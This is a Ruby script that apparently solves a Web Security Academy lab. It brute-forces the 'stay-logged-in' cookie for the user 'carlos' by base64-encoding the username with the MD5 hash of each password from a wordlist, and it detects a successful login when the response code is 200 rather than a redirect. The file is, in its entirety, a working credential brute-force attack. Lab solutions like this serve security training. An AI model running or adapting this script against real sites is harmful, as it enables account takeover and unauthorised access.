# frozen_string_literal: true

require 'uri'
require 'net/http'
require 'digest'
require 'base64'

CANDIDATE = 'carlos'
TARGET = "https://0a5c002f0302d8d5c194392e00e400d2.web-security-academy.net/my-account?id=#{CANDIDATE}"

uri = URI(TARGET)

req = Net::HTTP::Get.new(uri)

def get_res(req:, uri: URI(TARGET))
  Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
    http.request(req)
  end
end

PASSWORDS = 'password_list.txt'

File.readlines(PASSWORDS).each do |line|
  l = line.strip
  attempt = Base64.encode64("#{CANDIDATE}:#{Digest::MD5.hexdigest(l)}").strip
  req['Cookie'] = "stay-logged-in=#{attempt};"
  puts "Trying #{CANDIDATE}:#{l}"
  puts "stay-logged-in=#{attempt};"
  res = get_res(req: req)
  next unless res.code == '200' # Unsuccessful attempts result in 302 redirect

  puts "#{CANDIDATE}:#{l}"
  break
end
